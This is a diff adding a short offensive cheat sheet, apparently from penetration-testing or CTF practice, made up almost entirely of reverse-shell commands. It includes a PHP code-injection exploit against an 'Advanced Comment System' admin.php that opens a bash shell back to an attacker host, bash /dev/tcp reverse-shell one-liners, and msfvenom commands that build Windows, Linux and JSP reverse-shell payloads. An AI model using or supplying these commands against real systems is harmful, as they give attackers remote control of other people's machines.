@@ -1,0 +1,28 @@
+PHP ACS Shell stabilization ---->
+script /dev/null -qc /bin/bash
+
+
+Bash shell with lower port 443  ----------> 
+curl "http://IP/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" -s --data "<?system('/bin/bash -i >& /dev/tcp/KALI-IP/443 0>&1 ');?>"
+
+/bin/bash reverse shell listener
+bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
+
+
+NOT SO stable shell
+bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
+
+
+Windows Reverse shell 
+---
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > reverse.exe
+
+
+
+Linux Reverse Shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
+
+
+
+JSP Reverse Shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f raw > shell.jsp
